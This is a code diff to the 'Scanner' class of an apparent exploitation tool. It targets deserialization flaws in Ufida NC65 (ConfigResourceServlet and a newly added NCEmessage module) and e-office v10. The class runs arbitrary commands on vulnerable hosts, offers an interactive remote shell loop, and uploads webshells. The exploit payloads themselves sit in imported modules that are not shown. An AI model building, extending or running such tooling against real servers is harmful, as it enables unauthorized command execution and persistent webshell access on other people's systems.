@@ -6,27 +6,32 @@ from libs.custom_print import custom_print
 from prompt_toolkit.history import InMemoryHistory
 from model.model import Target
     
-
 class Scanner:
     def __init__(self, target:Optional[Target], flag:str) -> None:
         self.target = target
-        if flag == "1":
+        if flag == 1:
             from modules.ufida_ConfigResourceServlet import exp, upload_shell
             self.target.vulnerable_name="Ufida_NC65_ConfigResourceServlet_Deserialization"
-        elif flag == "2":
+        elif flag == 2:
             from modules.e_office_af import exp, upload_shell
             self.target.vulnerable_name="Eoffice_v10_Auth_File_Laravel_Deserialization"
+        elif flag == 3:
+            from modules.ufida_emessage import exp, upload_shell
+            self.target.vulnerable_name="Ufida_NC65_NCEmessage_Deserialization"
         self.exp = exp
         self.upload_webshell = upload_shell
 
-    def execute_command(self,java_path:Optional[str]=None, php_path:Optional[str]=None,cmd: str = "whoami", verbose: bool = True) -> str:
+    def execute_command(self,cmd: str = "whoami", verbose: bool = True) -> str:
         result = self.exp(target=self.target, cmd=cmd, verbose=verbose)
         return result
     
     
     def check_single_url(self, url:Optional[str])-> Tuple[str, bool]:
         self.target.url = url
-        result = self.execute_command(verbose=False)
+        result = self.execute_command(verbose=True)
+        if result == 1:
+            result = True
+            return result
         if not result or result.isspace():
             result=False
         else:
@@ -71,17 +76,18 @@ class Scanner:
                     elif cmd.lower() == "clear":
                         self.console.clear()
                         continue
-                    output: str = self.execute_command(cmd)
+                    output: str = self.execute_command(cmd=cmd,verbose=True)
                     if output:
                         print(f"{output}\n")
                 except KeyboardInterrupt:
-                    print("Exiting interactive shell...", "!")
+                    custom_print("Exiting interactive shell...", "!")
                     break
         else:
             custom_print("System is not vulnerable or check failed.", "-")
         
 
     def upload_webshell(self,file_path:str)->None:
+        print("Default Local Files, You Will Input Again!")
         r = self.upload_shell(target=self.target,file_path=file_path)
         if r:
             print(r)
